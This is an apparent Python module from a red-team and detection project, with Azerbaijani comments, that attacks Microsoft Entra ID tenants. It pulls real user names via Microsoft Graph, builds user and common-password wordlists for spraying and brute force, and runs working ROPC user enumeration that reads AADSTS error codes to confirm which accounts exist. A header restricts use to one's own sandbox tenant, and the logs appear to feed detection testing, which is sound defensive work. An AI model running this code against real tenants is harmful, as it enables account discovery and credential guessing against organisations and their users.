"""
modules/attack_engine.py
-------------------------
DİQQƏT (VACİB): Bu modul YALNIZ sizin ÖZ test/sandbox Microsoft Entra ID
kirayəçinizə (tenant) qarşı, açıq razılıqla istifadə edilməlidir.
Başqa təşkilatın kirayəçisinə qarşı istifadəsi qanunsuzdur və
Microsoft-un İstifadə Şərtlərini pozur.

DƏYİŞİKLİKLƏR (bu versiya — Cloud/Graph fix + resilience):
1. KÖK SƏBƏB DÜZƏLİŞİ: əvvəlki versiya istifadəçi siyahısını YALNIZ lokal
   `data/test_identities.json` faylından oxuyurdu. Bu fayl (düzgün olaraq)
   .gitignore-dadır və Streamlit Cloud-a deploy olunmur, ona görə Cloud-da
   avtomatik yaradılan boş nümunə fayl (tək bir placeholder user ilə) işə
   düşürdü və hücumlar saxta `fake_user_*` adlarına qarşı gedib AADSTS50034
   ilə uğursuz olurdu.
2. YENİ: `fetch_tenant_users_from_graph()` — artıq admin-consent verilmiş
   `User.Read.All` / `Directory.Read.All` Application icazələri ilə
   Microsoft Graph-dan HƏQİQİ tenant istifadəçilərini (UPN-ləri) çəkir.
   Bu, həm lokalda, həm Cloud-da EYNİ şəkildə işləyir, çünki heç bir yerli
   fayla ehtiyac duymur — yalnız `.env`/Cloud secrets-dəki
   TENANT_ID/CLIENT_ID/CLIENT_SECRET-ə əsaslanır.
3. YENİ: `_load_test_identities()` indi əvvəlcə `config.TEST_IDENTITIES_JSON`
   (Cloud secrets-də saxlanan JSON mətni) yoxlayır, sonra lokal fayla enir.
   Bu, "bilinən doğru şifrə" demo ssenarilərini TƏHLÜKƏSİZ şəkildə Cloud-a
   köçürməyə imkan verir (real şifrə heç vaxt git-ə commit olunmur).
4. Wordlist-lər artıq hər tətbiq başlanğıcında YENİDƏN generasiya olunur
   (əvvəlki versiya `if not os.path.exists(...)` ilə YALNIZ bir dəfə
   yazırdı — kod düzəldilsə belə köhnə fayl qalırdısa dəyişiklik heç vaxt
   görünməzdi).
5. RESILIENCE: bütün MSAL / Graph / şəbəkə çağırışları timeout, 429/throttling
   (Retry-After), eksponensial backoff + jitter və məhdud retry ilə
   sarınıb. Gözlənilməz Entra cavabı və ya şəbəkə kəsilməsi tətbiqi
   çökdürmür.
6. TELEMETRIYA: hər cəhd üçün UTC timestamp, simulyasiya olunmuş mənbə IP,
   user-agent, AADSTS kodu, Correlation/Trace ID loglanır. Mövcud print
   prefiksləri (`[+] MÖVCUDDUR`, `[-] UĞURSUZ`, `[=] XÜLASƏ` və s.) və
   public funksiya imzaları / return tipləri DEXİLMƏYİB — `app_ui.py`,
   Wazuh decoder və Supabase sahələri əvvəlki kimi işləyir.
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import random
import re
import time
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Tuple
from urllib.parse import quote

import msal
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

from . import config

# ---------------------------------------------------------------------------
# Public constants (app_ui.py / CLI bunları import edir — ADLARI DƏYİŞMƏ)
# ---------------------------------------------------------------------------
USERS_FILE = "users_wordlist.txt"
PASSWORDS_FILE = "passwords_wordlist.txt"

_DATA_DIR = os.path.join(os.path.dirname(__file__), "..", "data")
TEST_IDENTITIES_FILE = os.path.join(_DATA_DIR, "test_identities.json")

GRAPH_USERS_ENDPOINT = "https://graph.microsoft.com/v1.0/users"
GRAPH_ME_ENDPOINT = "https://graph.microsoft.com/v1.0/me"
GRAPH_DEFAULT_SCOPE = "https://graph.microsoft.com/.default"
ROPC_SCOPES = [GRAPH_DEFAULT_SCOPE]

# Mövcud UI/CLI delay-ləri (saniyə) — dəyişdirilməyib ki, Wazuh timestamp
# pəncərələri və rate-limit gözləntiləri eyni qalsın.
_ENUM_DELAY_S = 0.3
_SPRAY_DELAY_S = 0.4
_BRUTE_DELAY_S = 1.0
_MFA_DELAY_S = 2.0
_EXCEPTION_DELAY_S = 1.5

_HTTP_TIMEOUT_S = 15
_HTTP_TOKEN_TIMEOUT_S = 20
_MAX_HTTP_RETRIES = 4
_MAX_ROPC_RETRIES = 3
_BACKOFF_BASE_S = 1.5
_BACKOFF_CAP_S = 20.0

# User-enumeration: bu AADSTS kodları "istifadəçi MÖVCUDDUR" siqnalıdır.
# Əvvəlki siyahı saxlanılıb, MFA / CA / disabled kimi əlavə pozitiv
# siqnallar da daxil edilib (print mətni eynidir: "[+] MÖVCUDDUR").
_USER_EXISTS_CODES = (
    "AADSTS50126",   # invalid password (user exists)
    "AADSTS50055",   # password expired
    "AADSTS50053",   # account locked / smart lockout
    "AADSTS7000218", # public client not permitted (user still valid)
    "AADSTS50057",   # account disabled
    "AADSTS50076",   # MFA required
    "AADSTS50079",   # MFA enrollment required
    "AADSTS50074",   # user must complete MFA
    "AADSTS50158",   # external security challenge
    "AADSTS53003",   # blocked by Conditional Access
    "AADSTS53000",   # device compliance
    "AADSTS50005",   # device not registered for MFA
    "AADSTS50072",   # user must enroll in second factor
)
_USER_NOT_FOUND_CODES = ("AADSTS50034",)
_THROTTLE_CODES = (
    "AADSTS50196",  # duplicate / too many requests
    "AADSTS90033",  # transient service error
)

_AADSTS_RE = re.compile(r"(AADSTS\d{4,8})", re.IGNORECASE)
_CORR_RE = re.compile(r"Correlation ID:\s*([0-9a-fA-F-]{8,})", re.IGNORECASE)
_TRACE_RE = re.compile(r"Trace ID:\s*([0-9a-fA-F-]{8,})", re.IGNORECASE)
_TS_RE = re.compile(r"Timestamp:\s*([0-9T:\.\-\+Z ]+)", re.IGNORECASE)

# Yalnız telemetriya/log üçündür — real MSAL sorğusunun source IP-sini
# dəyişmir (ROPC Entra-ya MSAL-ın öz HTTP client-i ilə gedir).
_SIMULATED_SOURCE_IPS = (
    "45.133.1.27",
    "91.219.236.168",
    "185.220.101.54",
    "104.244.76.13",
    "198.98.51.90",
    "89.248.165.78",
    "193.32.162.154",
    "45.86.162.34",
    "5.183.95.12",
    "37.19.221.44",
)
_SIMULATED_USER_AGENTS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) "
    "Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "python-requests/2.32.3",
)

log = logging.getLogger("argus.attack_engine")
if not log.handlers:
    log.addHandler(logging.NullHandler())

# Modul-səviyyəli Graph HTTP sessiyası və CCA keşi (token təkraristifadəsi).
_HTTP: Optional[requests.Session] = None
_MODULE_CCA: Optional[msal.ConfidentialClientApplication] = None


# ===========================================================================
# Daxili köməkçilər (public API-yə daxil DEYİL)
# ===========================================================================
def _utc_now_iso() -> str:
    """UTC ISO-8601 timestamp (millisecond)."""
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _simulated_source_ip(seed: str) -> str:
    """Eyni UPN üçün sessiya ərzində sabit qalan simulyasiya IP-si."""
    digest = hashlib.sha256((seed or "argus").encode("utf-8", errors="replace")).digest()
    return _SIMULATED_SOURCE_IPS[digest[0] % len(_SIMULATED_SOURCE_IPS)]


def _simulated_user_agent(seed: str) -> str:
    digest = hashlib.sha256((seed or "argus").encode("utf-8", errors="replace")).digest()
    return _SIMULATED_USER_AGENTS[digest[1] % len(_SIMULATED_USER_AGENTS)]


def _first_line(text: Any, limit: int = 80) -> str:
    if not text:
        return ""
    line = str(text).splitlines()[0].strip()
    if len(line) > limit:
        return line[:limit]
    return line


def _parse_aadsts(error_description: str, error: str = "") -> Dict[str, str]:
    """Entra error_description-dan kod, correlation və trace ID çıxarır."""
    blob = f"{error_description or ''}\n{error or ''}"
    code_match = _AADSTS_RE.search(blob)
    corr_match = _CORR_RE.search(blob)
    trace_match = _TRACE_RE.search(blob)
    ts_match = _TS_RE.search(blob)
    return {
        "error_code": (code_match.group(1).upper() if code_match else (error or "")),
        "correlation_id": corr_match.group(1) if corr_match else "",
        "trace_id": trace_match.group(1) if trace_match else "",
        "entra_timestamp": ts_match.group(1).strip() if ts_match else "",
    }


def _contains_any(haystack: str, needles: Iterable[str]) -> bool:
    if not haystack:
        return False
    upper = haystack.upper()
    return any(n.upper() in upper for n in needles)


def _is_throttle_message(text: str) -> bool:
    if not text:
        return False
    lower = text.lower()
    if "too many requests" in lower or "throttl" in lower or "retry after" in lower:
        return True
    return _contains_any(text, _THROTTLE_CODES)


def _retry_after_seconds(response: Optional[requests.Response], attempt: int) -> float:
    """Retry-After header (saniyə və ya HTTP-date) və ya eksponensial backoff."""
    if response is not None:
        raw = response.headers.get("Retry-After") or response.headers.get("retry-after")
        if raw:
            try:
                return min(float(raw.strip()), _BACKOFF_CAP_S)
            except (TypeError, ValueError):
                pass
    delay = min(_BACKOFF_CAP_S, _BACKOFF_BASE_S * (2 ** max(0, attempt - 1)))
    jitter = random.uniform(0.0, 0.25 * delay)
    return delay + jitter


def _build_http_session() -> requests.Session:
    """429/5xx üçün urllib3 Retry + connection pool olan Session."""
    session = requests.Session()
    retry = Retry(
        total=_MAX_HTTP_RETRIES,
        connect=_MAX_HTTP_RETRIES,
        read=3,
        status=_MAX_HTTP_RETRIES,
        backoff_factor=0.8,
        status_forcelist=(429, 500, 502, 503, 504),
        allowed_methods=frozenset(["GET", "POST", "PATCH", "PUT", "DELETE", "HEAD"]),
        respect_retry_after_header=True,
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=8, pool_maxsize=8)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.headers.update(
        {
            "Accept": "application/json",
            "User-Agent": "Argus-ITDR/1.0 (IdentityAttackEngine; Entra-ROPC-sim)",
        }
    )
    return session


def _http_session() -> requests.Session:
    global _HTTP
    if _HTTP is None:
        _HTTP = _build_http_session()
    return _HTTP


def _safe_json(response: requests.Response) -> Tuple[Optional[Any], str]:
    """JSON parse xətasını crash-ə çevirmədən idarə edir."""
    try:
        return response.json(), ""
    except ValueError as exc:
        snippet = (response.text or "")[:200]
        return None, f"JSON parse xətası: {exc}; body={snippet!r}"


def _get_module_cca() -> msal.ConfidentialClientApplication:
    """App-only CCA — modul səviyyəsində keşlənir (MSAL in-memory token cache)."""
    global _MODULE_CCA
    if _MODULE_CCA is None:
        _MODULE_CCA = msal.ConfidentialClientApplication(
            config.CLIENT_ID,
            authority=config.AUTHORITY,
            client_credential=config.CLIENT_SECRET,
        )
    return _MODULE_CCA


def _acquire_graph_app_token() -> Tuple[bool, str]:
    """
    Client-credentials (app-only) token.

    Qaytarır: (True, access_token) və ya (False, xəta-mesajı).
    Heç vaxt exception bubble etmir.
    """
    if not config.has_graph_credentials():
        return False, "ARGUS_TENANT_ID/CLIENT_ID/CLIENT_SECRET tapılmadı."

    last_err = "naməlum"
    for attempt in range(1, _MAX_ROPC_RETRIES + 1):
        try:
            cca = _get_module_cca()
            token_result = cca.acquire_token_for_client(scopes=[GRAPH_DEFAULT_SCOPE])
            if not isinstance(token_result, dict):
                last_err = f"Gözlənilməz token cavabı: {type(token_result).__name__}"
            else:
                access_token = token_result.get("access_token")
                if access_token:
                    return True, access_token
                err_desc = token_result.get("error_description") or token_result.get("error") or "naməlum"
                parsed = _parse_aadsts(str(err_desc), str(token_result.get("error") or ""))
                last_err = _first_line(err_desc, 300)
                if _is_throttle_message(str(err_desc)) and attempt < _MAX_ROPC_RETRIES:
                    time.sleep(_retry_after_seconds(None, attempt))
                    continue
                return False, f"App-only token əldə edilmədi: {last_err} [{parsed['error_code']}]"
        except (requests.Timeout, requests.ConnectionError) as exc:
            last_err = f"şəbəkə: {exc}"
            if attempt < _MAX_ROPC_RETRIES:
                time.sleep(_retry_after_seconds(None, attempt))
                continue
        except Exception as exc:  # noqa: BLE001 — MSAL istənilən exception ata bilər
            last_err = str(exc)
            if _is_throttle_message(last_err) and attempt < _MAX_ROPC_RETRIES:
                time.sleep(_retry_after_seconds(None, attempt))
                continue
            return False, f"MSAL token xətası: {last_err}"
    return False, f"App-only token əldə edilmədi: {last_err}"


def _emit_telemetry(
    action: str,
    *,
    user: str = "",
    status: str = "",
    error_code: str = "",
    correlation_id: str = "",
    trace_id: str = "",
    extra: str = "",
) -> None:
    """Stdout (UI capture) + logger. Mövcud nəticə sətirlərini əvəz ETMİR."""
    seed = user or action
    ts = _utc_now_iso()
    ip = _simulated_source_ip(seed)
    ua = _simulated_user_agent(seed)
    ua_short = ua if len(ua) <= 72 else ua[:72] + "…"
    bits = [
        f"ts={ts}",
        f"action={action}",
        f"src_ip={ip}",
        f"ua={ua_short}",
    ]
    if user:
        bits.append(f"target_user={user}")
    if status:
        bits.append(f"Status={status}")
    if error_code:
        bits.append(f"error_code={error_code}")
    if correlation_id:
        bits.append(f"correlation_id={correlation_id}")
    if trace_id:
        bits.append(f"trace_id={trace_id}")
    if extra:
        bits.append(extra)
    line = "    [telemetry] " + " | ".join(bits)
    print(line)
    log.info(
        "attack_engine action=%s status=%s user=%s error_code=%s src_ip=%s ua=%s corr=%s trace=%s extra=%s",
        action,
        status,
        user,
        error_code,
        ip,
        ua,
        correlation_id,
        trace_id,
        extra,
    )


def _sample_identities_template() -> dict:
    return {
        "_warning": "Bu fayl real test istifadəçi məlumatlarınızı saxlayır. "
                    "Mütləq .gitignore-a əlavə edin, ictimai repoya push etməyin!",
        "_source": "local file (auto-generated placeholder)",
        "domain": config.DOMAIN or "example.onmicrosoft.com",
        "credentials": {
            "victimuser@example.onmicrosoft.com": "REPLACE_ME_ChangeThisPassword!"
        },
    }


# ===========================================================================
# Public helpers — imzalar və return tipləri saxlanılıb
# ===========================================================================
def _load_test_identities() -> dict:
    """
    Test istifadəçi/şifrə cütlüklərini yükləyir. Prioritet sırası:

      1. `config.TEST_IDENTITIES_JSON` — Cloud secrets-də (və ya .env-də)
         saxlanan tam JSON mətni (məs. Streamlit Cloud secrets.toml-da
         çox sətirli string kimi). Bu, real şifrələri git-ə commit etmədən
         Cloud-a təhlükəsiz köçürməyə imkan verir.
      2. Lokal `data/test_identities.json` faylı (yalnız lokal inkişaf üçün,
         .gitignore-da qalmalıdır).
      3. Heç biri yoxdursa, nümunə şablon yaradılır (REAL şifrə YAZMIR).
    """
    if config.TEST_IDENTITIES_JSON:
        try:
            data = json.loads(config.TEST_IDENTITIES_JSON)
            if not isinstance(data, dict):
                raise json.JSONDecodeError("root JSON object deyil", str(data)[:80], 0)
            data["_source"] = "secrets (ARGUS_TEST_IDENTITIES_JSON)"
            return data
        except json.JSONDecodeError as e:
            print(f"[!] ARGUS_TEST_IDENTITIES_JSON parse xətası, lokal fayla keçilir: {e}")

    if not os.path.exists(TEST_IDENTITIES_FILE):
        try:
            os.makedirs(_DATA_DIR, exist_ok=True)
            sample = _sample_identities_template()
            with open(TEST_IDENTITIES_FILE, "w", encoding="utf-8") as f:
                json.dump(sample, f, indent=2, ensure_ascii=False)
            return sample
        except OSError as e:
            print(f"[!] test_identities.json yaradıla bilmədi: {e}")
            return _sample_identities_template()

    try:
        with open(TEST_IDENTITIES_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict):
            print("[!] test_identities.json obyekt deyil, nümunə şablona keçilir.")
            return _sample_identities_template()
        data.setdefault("_source", "local file (data/test_identities.json)")
        return data
    except (OSError, json.JSONDecodeError) as e:
        print(f"[!] test_identities.json oxuna/parse edilə bilmədi, nümunə şablona keçilir: {e}")
        return _sample_identities_template()


_identities = _load_test_identities()
DOMAIN = config.DOMAIN or _identities.get("domain", "example.onmicrosoft.com")
_raw_creds = _identities.get("credentials", {})
REAL_CREDENTIALS = dict(_raw_creds) if isinstance(_raw_creds, dict) else {}
IDENTITIES_SOURCE = _identities.get("_source", "unknown")


def fetch_tenant_users_from_graph(max_users: int = 200):
    """
    Microsoft Graph-dan (app-only, client credentials) HƏQİQİ tenant
    istifadəçilərinin userPrincipalName siyahısını çəkir.

    Tələb olunan Application (app-only) icazələri (admin consent ilə):
        - User.Read.All   VƏ YA
        - Directory.Read.All

    Qaytarır: (ok: bool, data: list[str] | str-xəta-mesajı)

    QEYD: Bu, YALNIZ istifadəçilərin MÖVCUDLUĞUNU (kimin hesabı var) həll edir.
    Şifrələri Graph API heç vaxt qaytarmır (mümkün deyil) — brute-force/spray
    demo ssenariləri üçün bilinən "doğru" şifrə hələ də `REAL_CREDENTIALS`-dan
    (yəni Cloud secrets və ya lokal test_identities.json-dan) gəlməlidir.
    """
    if not config.has_graph_credentials():
        return False, "ARGUS_TENANT_ID/CLIENT_ID/CLIENT_SECRET tapılmadı."

    try:
        ok, token_or_err = _acquire_graph_app_token()
        if not ok:
            return False, token_or_err
        access_token = token_or_err
    except Exception as e:  # noqa: BLE001
        return False, f"MSAL token xətası: {e}"

    headers = {"Authorization": f"Bearer {access_token}"}
    url: Optional[str] = (
        f"{GRAPH_USERS_ENDPOINT}?$select=userPrincipalName,accountEnabled&$top=999"
    )
    users: List[str] = []
    session = _http_session()

    try:
        while url and len(users) < max_users:
            resp: Optional[requests.Response] = None
            last_err: Optional[str] = None
            for attempt in range(1, _MAX_HTTP_RETRIES + 1):
                try:
                    resp = session.get(url, headers=headers, timeout=_HTTP_TIMEOUT_S)
                    if resp.status_code == 429:
                        wait = _retry_after_seconds(resp, attempt)
                        log.warning("Graph 429, %.1fs gözlənilir (attempt %s)", wait, attempt)
                        time.sleep(wait)
                        last_err = f"Graph HTTP 429: {resp.text[:200]}"
                        continue
                    break
                except (requests.Timeout, requests.ConnectionError) as e:
                    last_err = f"Graph sorğu xətası: {e}"
                    if attempt < _MAX_HTTP_RETRIES:
                        time.sleep(_retry_after_seconds(None, attempt))
                        continue
                    return False, last_err
                except requests.RequestException as e:
                    return False, f"Graph sorğu xətası: {e}"

            if resp is None:
                return False, last_err or "Graph sorğu xətası: cavab yoxdur"

            if resp.status_code != 200:
                # Ən çox rastlanan hal: admin consent hələ təsdiqlənməyib (403),
                # ya da icazə tipi Delegated seçilib, Application yox.
                return False, f"Graph HTTP {resp.status_code}: {resp.text[:300]}"

            body, parse_err = _safe_json(resp)
            if body is None or not isinstance(body, dict):
                return False, f"Graph HTTP {resp.status_code}: {parse_err or 'gözlənilməz cavab'}"

            for u in body.get("value") or []:
                if not isinstance(u, dict):
                    continue
                upn = u.get("userPrincipalName")
                # YALNIZ aktiv VƏ daxili (#EXT# olmayan) real istifadəçilər siyahıya alınır:
                if upn and u.get("accountEnabled", True) and "#EXT#" not in str(upn):
                    users.append(str(upn))

            next_link = body.get("@odata.nextLink")
            url = next_link if isinstance(next_link, str) and next_link else None

        return True, users[:max_users]
    except Exception as e:  # noqa: BLE001
        return False, f"Graph sorğu xətası: {e}"


def generate_wordlists(force_refresh: bool = True):
    """
    BUG FIX: əvvəllər `if not os.path.exists(...)` şərti ilə yalnız BİR DƏFƏ
    yazılırdı — kod düzəldilsə belə, köhnə fayl mövcud qalırsa dəyişiklik heç
    vaxt tətbiq olunmurdu. İndi default olaraq `force_refresh=True` ilə hər
    tətbiq başlanğıcında YENİDƏN generasiya olunur (bu, sadə mətn faylları
    üçün ucuz əməliyyatdır, performans problemi yaratmır).

    İstifadəçi siyahısı üçün prioritet:
        1. Microsoft Graph-dan canlı çəkilən HƏQİQİ tenant istifadəçiləri
           (fetch_tenant_users_from_graph()) — həm lokal, həm Cloud-da eyni
           işləyir, çünki heç bir yerli fayla bağlı deyil.
        2. Graph sorğusu uğursuz olarsa (icazə yoxdur/şəbəkə problemi),
           REAL_CREDENTIALS-dakı (secrets və ya lokal fayl) bilinən
           istifadəçilərə enilir.
    Hər iki halda nəticəyə bir neçə aydın "fake_*" adı əlavə olunur ki,
    enumeration/negative-test ssenariləri də sınana bilsin.

    Qaytarır (dəyişməz açarlar):
        user_source, real_user_count, fake_user_count,
        graph_fetch_ok, graph_fetch_detail
    """
    graph_ok, graph_result = fetch_tenant_users_from_graph()

    if graph_ok and graph_result:
        real_users = list(graph_result)
        user_source = "Microsoft Graph (canlı tenant sorğusu)"
    else:
        real_users = list(REAL_CREDENTIALS.keys())
        user_source = (
            f"local fallback ({IDENTITIES_SOURCE}) — Graph fetch uğursuz oldu: "
            f"{graph_result if not graph_ok else 'boş nəticə'}"
        )

    # Bilinən şifrəli istifadəçilər (REAL_CREDENTIALS) həmişə siyahıya daxil
    # edilir ki, brute-force demo hədəfi itməsin, hətta Graph fetch uğurlu olsa da.
    for known_user in REAL_CREDENTIALS.keys():
        if known_user not in real_users:
            real_users.append(known_user)

    fake_users = [f"fake_user_{i}@{DOMAIN}" for i in range(1, 100)] + \
                 [f"corp_admin_{i}@{DOMAIN}" for i in range(1, 50)]
    all_users = real_users + fake_users

    all_passwords = None
    if force_refresh or not os.path.exists(PASSWORDS_FILE):
        real_passwords = list(REAL_CREDENTIALS.values())
        common_passwords = [
            "Password123!", "Admin2026!", "Welcome123!", "Spring2026!",
            "Security123!Entra", "Corporate2026!", "ChangeMe123!", "Company123!"
        ]
        all_passwords = common_passwords + real_passwords

    if force_refresh or not os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "w", encoding="utf-8") as f:
                for u in all_users:
                    f.write(f"{u}\n")
        except OSError as e:
            print(f"[!] Wordlist yazıla bilmədi ({USERS_FILE}): {e}")

    if all_passwords is not None:
        try:
            with open(PASSWORDS_FILE, "w", encoding="utf-8") as f:
                for p in all_passwords:
                    f.write(f"{p}\n")
        except OSError as e:
            print(f"[!] Wordlist yazıla bilmədi ({PASSWORDS_FILE}): {e}")

    # Diaqnoz üçün UI-a ötürülə bilsin deyə qaytarırıq — səssiz fallback yoxdur.
    return {
        "user_source": user_source,
        "real_user_count": len(real_users),
        "fake_user_count": len(fake_users),
        "graph_fetch_ok": graph_ok,
        "graph_fetch_detail": graph_result if not graph_ok else f"{len(graph_result)} istifadəçi tapıldı",
    }


def load_list_from_file(filepath):
    """Wordlist-i sətir-sətir oxuyur. Fayl yoxdursa boş siyahı (crash yox)."""
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist tapılmadı: {filepath}")
        return []
    except OSError as e:
        print(f"[!] Wordlist oxuna bilmədi ({filepath}): {e}")
        return []


# ===========================================================================
# Engine
# ===========================================================================
class IdentityAttackEngine:
    """
    Red Team simulyasiya mühərriki (offensive) + Blue Team remediation (defensive).
    """

    def __init__(self, users_file, passwords_file):
        if not config.has_graph_credentials():
            raise RuntimeError(
                "ARGUS_TENANT_ID / ARGUS_CLIENT_ID / ARGUS_CLIENT_SECRET tapılmadı. "
                ".env faylını (yaxud Streamlit Cloud Secrets-i) doldurun."
            )
        self.public_app = msal.PublicClientApplication(
            config.CLIENT_ID, authority=config.AUTHORITY
        )
        self.users = load_list_from_file(users_file)
        self.passwords = load_list_from_file(passwords_file)
        self._cca: Optional[msal.ConfidentialClientApplication] = None
        self._session = _http_session()

    def _get_cca(self) -> msal.ConfidentialClientApplication:
        if self._cca is None:
            self._cca = msal.ConfidentialClientApplication(
                config.CLIENT_ID,
                authority=config.AUTHORITY,
                client_credential=config.CLIENT_SECRET,
            )
        return self._cca

    def _ropc(self, username: str, password: str) -> Dict[str, Any]:
        """
        ROPC cəhdi. Heç vaxt exception buraxmır.

        Qaytarılan daxili dict (public API deyil):
            ok, access_token, error, error_description, error_code,
            correlation_id, trace_id, throttled, exception
        """
        empty = {
            "ok": False,
            "access_token": None,
            "error": "",
            "error_description": "",
            "error_code": "",
            "correlation_id": "",
            "trace_id": "",
            "throttled": False,
            "exception": "",
        }
        last = dict(empty)
        for attempt in range(1, _MAX_ROPC_RETRIES + 1):
            try:
                result = self.public_app.acquire_token_by_username_password(
                    username=username,
                    password=password,
                    scopes=ROPC_SCOPES,
                )
            except Exception as e:  # noqa: BLE001 — MSAL 429/realm-discovery raw exception atır
                msg = str(e)
                last = dict(empty)
                last["exception"] = msg
                last["error_description"] = msg
                last["throttled"] = _is_throttle_message(msg)
                parsed = _parse_aadsts(msg)
                last["error_code"] = parsed["error_code"]
                last["correlation_id"] = parsed["correlation_id"]
                last["trace_id"] = parsed["trace_id"]
                if last["throttled"] and attempt < _MAX_ROPC_RETRIES:
                    time.sleep(_retry_after_seconds(None, attempt))
                    continue
                return last

            if not isinstance(result, dict):
                last = dict(empty)
                last["exception"] = f"gözlənilməz Entra cavabı: {type(result).__name__}"
                last["error_description"] = last["exception"]
                return last

            if result.get("access_token"):
                return {
                    "ok": True,
                    "access_token": result["access_token"],
                    "error": "",
                    "error_description": "",
                    "error_code": "",
                    "correlation_id": str(result.get("correlation_id") or ""),
                    "trace_id": str(result.get("trace_id") or ""),
                    "throttled": False,
                    "exception": "",
                }

            err_desc = str(result.get("error_description") or "")
            err = str(result.get("error") or "")
            parsed = _parse_aadsts(err_desc, err)
            throttled = _is_throttle_message(err_desc) or _is_throttle_message(err)
            last = {
                "ok": False,
                "access_token": None,
                "error": err,
                "error_description": err_desc,
                "error_code": parsed["error_code"] or err,
                "correlation_id": parsed["correlation_id"],
                "trace_id": parsed["trace_id"],
                "throttled": throttled,
                "exception": "",
            }
            if throttled and attempt < _MAX_ROPC_RETRIES:
                time.sleep(_retry_after_seconds(None, attempt))
                continue
            return last
        return last

    def _graph_request(
        self,
        method: str,
        url: str,
        token: str,
        json_body: Optional[dict] = None,
        timeout: int = _HTTP_TIMEOUT_S,
    ) -> Tuple[Optional[requests.Response], str]:
        """Graph HTTP. Qaytarır: (response | None, error_message). Exception yox."""
        headers = {"Authorization": f"Bearer {token}"}
        if json_body is not None:
            headers["Content-Type"] = "application/json"
        last_err = "naməlum"
        for attempt in range(1, _MAX_HTTP_RETRIES + 1):
            try:
                resp = self._session.request(
                    method.upper(),
                    url,
                    headers=headers,
                    json=json_body,
                    timeout=timeout,
                )
                if resp.status_code == 429 and attempt < _MAX_HTTP_RETRIES:
                    time.sleep(_retry_after_seconds(resp, attempt))
                    last_err = f"HTTP 429: {resp.text[:200]}"
                    continue
                return resp, ""
            except (requests.Timeout, requests.ConnectionError) as e:
                last_err = str(e)
                if attempt < _MAX_HTTP_RETRIES:
                    time.sleep(_retry_after_seconds(None, attempt))
                    continue
                return None, f"şəbəkə: {last_err}"
            except requests.RequestException as e:
                return None, f"sorğu: {e}"
            except Exception as e:  # noqa: BLE001
                return None, f"gözlənilməz: {e}"
        return None, last_err

    # ------------------------------------------------------------------
    # RED TEAM — Hücum simulyasiyaları (əvvəlki məntiq eynilə saxlanılıb)
    # ------------------------------------------------------------------
    def run_user_enumeration(self, max_targets=20):
        print(f"\n[*] --- USER ENUMERATION TESTİ (İlk {max_targets} Hədəf) ---")
        for user in self.users[:max_targets]:
            # BUG FIX: MSAL bəzi hallarda (throttling/429, realm discovery xətası)
            # OAuth error dict qaytarmır — birbaşa exception atır. try/except
            # olmadan tək bir throttled sorğu bütün prosesi çökərtə bilər.
            try:
                attempt = self._ropc(user, "DummyPassword123!")
                if attempt["exception"] and not attempt["error_description"]:
                    print(f"[-] UĞURSUZ (exception): {user} -> {str(attempt['exception'])[:80]}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="Exception",
                        error_code=attempt["error_code"] or "EXCEPTION",
                        extra="AuthenticationMethod=ROPC",
                    )
                    time.sleep(_EXCEPTION_DELAY_S)
                    continue

                err_desc = attempt["error_description"]
                code = attempt["error_code"]
                combined = f"{code} {err_desc}"
                if attempt["ok"]:
                    # Dummy parol ilə token — praktikada demək olar ki, olmur.
                    print(f"[+] MÖVCUDDUR (Valid User): {user}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="ValidUser",
                        error_code="AUTH_SUCCESS",
                        extra="AuthenticationMethod=ROPC",
                    )
                elif any(c in combined for c in _USER_EXISTS_CODES):
                    print(f"[+] MÖVCUDDUR (Valid User): {user}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="ValidUser",
                        error_code=code or "AADSTS50126",
                        correlation_id=attempt["correlation_id"],
                        trace_id=attempt["trace_id"],
                        extra="AuthenticationMethod=ROPC",
                    )
                elif any(c in combined for c in _USER_NOT_FOUND_CODES):
                    print(f"[-] MÖVCUD DEYİL (Invalid User): {user}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="InvalidUser",
                        error_code=code or "AADSTS50034",
                        correlation_id=attempt["correlation_id"],
                        trace_id=attempt["trace_id"],
                        extra="AuthenticationMethod=ROPC",
                    )
                elif attempt["exception"]:
                    print(f"[-] UĞURSUZ (exception): {user} -> {str(attempt['exception'])[:80]}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="Exception",
                        error_code=code or "EXCEPTION",
                        extra="AuthenticationMethod=ROPC",
                    )
                    time.sleep(_EXCEPTION_DELAY_S)
                    continue
                else:
                    print(f"[?] CAVAB ({user}): {err_desc[:50]}")
                    _emit_telemetry(
                        "user_enumeration",
                        user=user,
                        status="Unknown",
                        error_code=code or "UNKNOWN",
                        correlation_id=attempt["correlation_id"],
                        trace_id=attempt["trace_id"],
                        extra="AuthenticationMethod=ROPC",
                    )
            except Exception as e:  # noqa: BLE001
                print(f"[-] UĞURSUZ (exception): {user} -> {str(e)[:80]}")
                _emit_telemetry(
                    "user_enumeration",
                    user=user,
                    status="Exception",
                    error_code="EXCEPTION",
                    extra="AuthenticationMethod=ROPC",
                )
                time.sleep(_EXCEPTION_DELAY_S)
                continue
            time.sleep(_ENUM_DELAY_S)

